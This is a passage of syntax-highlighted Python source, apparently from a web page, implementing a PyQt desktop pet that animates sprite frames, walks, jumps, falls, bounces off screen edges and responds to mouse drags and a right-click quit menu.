class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;6&#x27;</span>], <span class="comment"># 拖动_3</span></span><br><span class="line">        [<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11&#x27;</span>], <span class="comment"># 打哈切_4</span></span><br><span class="line">        [<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>, <span class="string">&#x27;14&#x27;</span>], <span class="comment"># 爬_5</span></span><br><span class="line">        [<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>], <span class="comment"># 触地_6</span></span><br><span class="line">        [<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;21&#x27;</span>], <span class="comment"># 睡觉_7</span></span><br><span class="line">        [<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>], <span class="comment"># 跳跃_8</span></span><br><span class="line">        [<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23b&#x27;</span>,<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;25&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>], <span class="comment"># 举手_9</span></span><br><span class="line">        [<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 攻击_10</span></span><br><span class="line">        [<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;33&#x27;</span>], <span class="comment"># 打喷嚏_11</span></span><br><span class="line">        [<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 撞墙_12</span></span><br><span class="line">    ]</span><br><span class="line">    PET_ACTIONS_MAP = &#123;<span class="string">&#x27;pet_1&#x27;</span>: ACTION_DISTRIBUTION&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>): PET_ACTIONS_MAP.update(&#123;<span class="string">&#x27;pet_%s&#x27;</span> % i+<span class="number">1</span>: ACTION_DISTRIBUTION&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;桌面宠物&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DesktopPet</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    tool_name = <span class="string">&#x27;桌面宠物&#x27;</span></span><br><span class="line">    stat = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, parent=<span class="literal">None</span>, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DesktopPet, self).__init__(parent)</span><br><span class="line">        self.cfg = Config()</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(self.cfg, key): <span class="built_in">setattr</span>(self.cfg, key, value)</span><br><span class="line">        self.setWindowFlags(Qt.FramelessWindowHint|Qt.WindowStaysOnTopHint|Qt.SubWindow)</span><br><span class="line">        self.setAutoFillBackground(<span class="literal">False</span>)</span><br><span class="line">        self.setAttribute(Qt.WA_TranslucentBackground, <span class="literal">True</span>)</span><br><span class="line">        self.repaint()</span><br><span class="line">        self.pet_images, iconpath = self.randomLoadPetImages()</span><br><span class="line">        quit_action = QAction(<span class="string">&#x27;退出&#x27;</span>, self, triggered=self.quit)</span><br><span class="line">        quit_action.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon_menu = QMenu(self)</span><br><span class="line">        self.tray_icon_menu.addAction(quit_action)</span><br><span class="line">        self.tray_icon = QSystemTrayIcon(self)</span><br><span class="line">        self.tray_icon.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon.setContextMenu(self.tray_icon_menu)</span><br><span class="line">        self.tray_icon.show()</span><br><span class="line">        self.image = QLabel(self)</span><br><span class="line">        self.setImage(self.pet_images[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.mouse_drag_pos = self.pos()</span><br><span class="line">        self.resize(<span class="number">236</span>, <span class="number">260</span>)</span><br><span class="line">        self.randomPosition()</span><br><span class="line">        self.show()</span><br><span class="line">        self.is_running_action = <span class="literal">False</span></span><br><span class="line">        self.action_images = []</span><br><span class="line">        self.action_pointer = <span class="number">0</span></span><br><span class="line">        self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.x = self.pos().x()</span><br><span class="line">        self.y = self.pos().y()</span><br><span class="line">        self.heading = <span class="number">0</span></span><br><span class="line">        self.touchdown_key = <span class="number">0</span></span><br><span class="line">        self.jumpping_key = <span class="number">0</span></span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;初始化计时器&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">InitTimer</span>(<span class="params">self,Act,start</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.timeout.connect(Act)</span><br><span class="line">        self.timer.start(start)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机做一个动作&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomAct</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.key = random.randint(<span class="number">0</span>,<span class="built_in">len</span>(DesktopPet.stat)-<span class="number">1</span>)</span><br><span class="line">            self.action = DesktopPet.stat[self.key]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span>+<span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> self.heading == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Right&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.heading == <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Left&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.action == <span class="number">8</span>:</span><br><span class="line">                self.jumpping_key = <span class="number">1</span></span><br><span class="line">                self.InitTimer(self.randomAct,<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.touchdown_key == <span class="number">1</span>:</span><br><span class="line">            self.action_images = self.pet_images[<span class="number">6</span>]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.touchdown()</span><br><span class="line">        <span class="keyword">elif</span> self.jumpping_key == <span class="number">1</span>:</span><br><span class="line">            self.action_images = self.pet_images[<span class="number">8</span>]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.jumpping()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                self.moving()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;完成动作的每一帧&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runFrame</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            <span class="keyword">if</span> self.action != <span class="number">3</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moving</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            time.sleep(<span class="number">0.8</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            self.x = self.pos().x()</span><br><span class="line">            self.x += <span class="built_in">int</span>(<span class="number">32</span> * (<span class="number">0.5</span> - self.heading))</span><br><span class="line">            <span class="keyword">if</span> (self.heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.heading = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (self.heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.heading = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">1</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-撞墙&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hitwall</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.move(self.x, self.pos().y())</span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-坠落&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fall</span>(<span class="params">self</span>):</span></span><br><span class="line">        y = self.pos().y()</span><br><span class="line">        x = self.pos().x()</span><br><span class="line">        y += <span class="built_in">int</span>(<span class="number">16</span>)</span><br><span class="line">        screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">        <span class="keyword">if</span> (y &gt;= screenRect.height() - self.size().height()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;now is kiss the ground&#x27;</span>)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.touchdown_key = <span class="number">1</span></span><br><span class="line">            self.InitTimer(self.randomAct,<span class="number">80</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.move(x,y)</span><br><span class="line">            self.setImage(self.pet_images[<span class="number">6</span>][<span class="number">0</span>].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-触地&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">touchdown</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x = self.pos().x()</span><br><span class="line">        self.y = self.pos().y()</span><br><span class="line">        self.x -= <span class="number">2</span></span><br><span class="line">        self.y -= <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">            self.touchdown_key = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.move(self.x, self.y)</span><br><span class="line">            self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">            self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-吃瘪&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">uncomfortable</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.action = <span class="number">0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span> + <span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-拖动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dragging</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.action = <span class="number">3</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span> + <span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-跳跃&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jumpping</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == <span class="number">0</span>:</span><br><span class="line">            self.z = <span class="number">80</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.fallingBody()</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">            self.jumpping_key = <span class="number">0</span></span><br><span class="line">            self.z = <span class="number">80</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            self.x = self.pos().x()</span><br><span class="line">            self.y = self.pos().y()</span><br><span class="line">            self.x += <span class="built_in">int</span>(<span class="number">48</span> * (<span class="number">0.5</span> - self.heading))</span><br><span class="line">            self.y -= self.z</span><br><span class="line">            self.z -= <span class="number">5</span></span><br><span class="line">            <span class="keyword">if</span> (self.heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.fallingBody()</span><br><span class="line">                    self.heading = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.y)</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (self.heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    x = self.pos().x()</span><br><span class="line">                    x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.fallingBody()</span><br><span class="line">                    self.heading = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.y)</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;设置当前显示的图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setImage</span>(<span class="params">self, image</span>):</span></span><br><span class="line">        self.image.setPixmap(QPixmap.fromImage(image))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机导入一个桌面宠物的所有图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomLoadPetImages</span>(<span class="params">self</span>):</span></span><br><span class="line">        cfg = self.cfg</span><br><span class="line">        pet_name = random.choice(<span class="built_in">list</span>(cfg.PET_ACTIONS_MAP.keys()))</span><br><span class="line">        actions = cfg.PET_ACTIONS_MAP[pet_name]</span><br><span class="line">        pet_images = []</span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> action <span class="keyword">in</span> actions:</span><br><span class="line">            patch = [self.loadImage(os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shime&#x27;</span>+item+<span class="string">&#x27;.png&#x27;</span>)) <span class="keyword">for</span> item <span class="keyword">in</span> action]</span><br><span class="line">            pet_images.append(patch)</span><br><span class="line">        iconpath = os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shimeX.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pet_images, iconpath</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标左右键功能&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mousePressEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.button() == Qt.LeftButton:</span><br><span class="line">            self.InitTimer(self.dragging,<span class="number">80</span>)</span><br><span class="line">            self.is_follow_mouse = <span class="literal">True</span></span><br><span class="line">            self.mouse_drag_pos = event.globalPos() - self.pos()</span><br><span class="line">            event.accept()</span><br><span class="line">            self.setCursor(QCursor(Qt.OpenHandCursor))</span><br><span class="line">        <span class="keyword">elif</span> event.button() == Qt.RightButton:</span><br><span class="line">            self.InitTimer(self.uncomfortable,<span class="number">80</span>)</span><br><span class="line">            self.menu = QMenu(self)</span><br><span class="line">            self.quit = self.menu.addAction(<span class="string">&quot;退出&quot;</span>)</span><br><span class="line">            self.choice = self.menu.exec_(self.mapToGlobal(event.pos()))</span><br><span class="line">            <span class="keyword">if</span>(self.choice == self.quit):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">                DesktopPet.quit()</span><br><span class="line">            self.randomAct()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标移动, 则宠物也移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseMoveEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> Qt.LeftButton <span class="keyword">and</span> self.is_follow_mouse:</span><br><span class="line">            self.move(event.globalPos() - self.mouse_drag_pos)</span><br><span class="line">            event.accept()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标释放时, 取消绑定&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseReleaseEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.setCursor(QCursor(Qt.ArrowCursor))</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;宠物自由落体&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fallingBody</span>(<span class="params">self</span>):</span></span><br><span class="line">        x = self.pos().x()</span><br><span class="line">        y = self.pos().y()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x=%x : y=%x&quot;</span> %(x,y))</span><br><span class="line">        self.InitTimer(self.fall,<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;导入图像&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loadImage</span>(<span class="params">self, imagepath</span>):</span></span><br><span class="line">        image = QImage()</span><br><span class="line">        image.load(imagepath)</span><br><span 